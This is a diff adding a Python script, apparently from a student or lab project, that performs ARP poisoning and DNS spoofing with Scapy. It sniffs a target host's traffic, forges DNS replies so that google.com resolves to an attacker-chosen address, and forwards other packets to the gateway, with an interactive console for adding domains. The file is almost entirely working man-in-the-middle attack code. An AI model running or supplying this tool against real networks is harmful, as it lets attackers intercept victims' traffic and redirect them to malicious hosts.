@@ -1,0 +1,154 @@
+from tabnanny import verbose
+from arp import *
+from scapy.all import *
+import subprocess
+import socket
+import time
+import dummy_thread as _thread
+import termios
+import tty
+import sys
+
+# TODO:
+# [] Fake pings
+# [] Add multiple targets
+# [] Find network submask of host and search for hosts within it
+# [] Make # of packets sent during each phase customizable
+# [] Add silent attack
+# [X] Make attack interruptable
+# Make sure interfaces work with host scanning and poisoning
+
+# [] make 2 separate files with newest ARP + code cleanup
+# [] make commands to add DNS address to table, select DNS spoof victim
+# [] generalise (find gateway router (IP + MAC))
+
+def set_default_spoof_address():
+    return "10.0.2.4"
+
+sock = conf.L2socket(iface=intface)
+intface="enp0s9"
+
+dns_server_ip = "131.155.3.3"
+dns_server_mac = "52:54:00:12:35:00"
+
+#[] get server ip
+#[*] poison target's arp table
+#[*] intercept dns(udp) packets from target(use stopfilter function of sniff in scapy)
+#[] send them to server
+#[] receive reply from server
+#[*] replace ip in server's response with own ip(change checksum)
+#[*] send modified packet to client
+
+Target1 = [{"ip_addr" : "10.0.2.6", "mac_addr" : "08:00:27:25:0A:A4"}]
+#Target2 = {"ip_addr" : "192.168.56.102", "mac_addr" : "08:00:27:cc:08:6f"}
+Target2 = [{"ip_addr" : "10.0.2.1", "mac_addr" : "52:54:00:12:35:00"}]
+
+spoof_address=set_default_spoof_address()
+dns_to_spoof={
+    b"google.com.":host_ip_addr,
+    b"www.google.com.":host_ip_addr
+}
+
+def dns_spoof(pkt, ip_of_dns):
+    spoofed_pkt=pkt.copy()
+    qname=pkt[DNSQR].qname
+
+    spoofed_pkt[Ether].src=pkt[Ether].dst
+    spoofed_pkt[Ether].dst=pkt[Ether].src
+    spoofed_pkt[IP].src=str(pkt[IP].dst)
+    spoofed_pkt[IP].dst=str(pkt[IP].src)
+    spoofed_pkt[DNS].an=DNSRR(rrname=qname, rdata=ip_of_dns)
+    spoofed_pkt[DNS].ancount=1
+    spoofed_pkt[UDP].sport=pkt[UDP].dport
+    spoofed_pkt[UDP].dport=pkt[UDP].sport
+
+    del spoofed_pkt[IP].len
+    del spoofed_pkt[IP].chksum
+    del spoofed_pkt[UDP].len
+    del spoofed_pkt[UDP].chksum
+
+    sock.send(spoofed_pkt)
+
+def forward(pkt):
+    pkt[Ether].dst=dns_server_mac
+
+    if pkt.haslayer(IP):
+        del pkt[IP].len
+        del pkt[IP].chksum
+
+    if pkt.haslayer(UDP):
+        del pkt[UDP].len
+        del pkt[UDP].chksum
+
+    sock.send(pkt)
+
+def dns_react(pkt):
+    if pkt.haslayer(DNS) and dns_to_spoof.has_key(pkt[DNSQR].qname):
+        dns_spoof(pkt, spoof_address)
+    else:
+        forward(pkt)
+
+def start_dns_spoof():
+    sniff(store=0, filter="src host 10.0.2.6", iface="enp0s9", prn = lambda x: dns_react(x))#, timeout=10)
+    #sock.close()
+
+def add_dns_address(dns):
+    dns_to_spoof[dns+"."]=host_ip_addr
+    print("Table containing DNS addresses to spoof was updated: \"" + dns + ".\"" + " was added.")
+
+def set_spoof_address(ip):
+    global spoof_address
+    spoof_address=ip
+    print("Spoof address was set to: " + ip)
+
+def print_dns_help_list():
+    print("add [n] -- add DNS address [n] to spoofing table")
+    print_arp_help_list()
+
+def find_gateway_router():
+    print("Searching for gateway router...")
+
+    global dns_server_ip
+    global dns_server_mac
+    global Target2
+
+    gws=conf.route.route("0.0.0.0")[2]
+    print(gws)
+
+    # pkt = Ether(src=host_mac_addr)/IP(src=host_ip_addr)/UDP()/DNS(rd=1, qd=DNSQR("google.com."))
+    # ans=srp1()[0]
+    dns_server_ip=gws
+    dns_server_mac=getmacbyip(gws)
+
+    print("Found gateway router:")
+    print("IP: " + dns_server_ip)
+    print("MAC: " + dns_server_mac)
+
+    Target2[0]["ip_addr"]=dns_server_ip
+    Target2[0]["mac_addr"]=dns_server_mac
+    print(Target2)
+
+def dns_command_handler(cmd):
+    if cmd[0]=="add":
+        add_dns_address(cmd[1])
+    elif cmd[0]=="set" and cmd[1]=="spoof" and cmd[2]=="address":
+        set_spoof_address(cmd[3])
+    elif cmd[0]=="help":
+        print_dns_help_list()
+    elif cmd[0]=="spoof":
+        start_dns_spoof()
+    else:
+        arp_command_handler(cmd)
+
+
+def main_dns():
+    print("Welcome to ARP_HAX0R_1337 (name subject to change). Type 'help' for a list of commands.")
+    print("Default interface set as: " + get_interface())
+    print("Time to do the DNS I guess")
+    find_gateway_router()
+    poison(Target1, Target2, 0, 10)
+    while (True):
+        cmd = raw_input().split(" ")
+        dns_command_handler(cmd)
+
+        
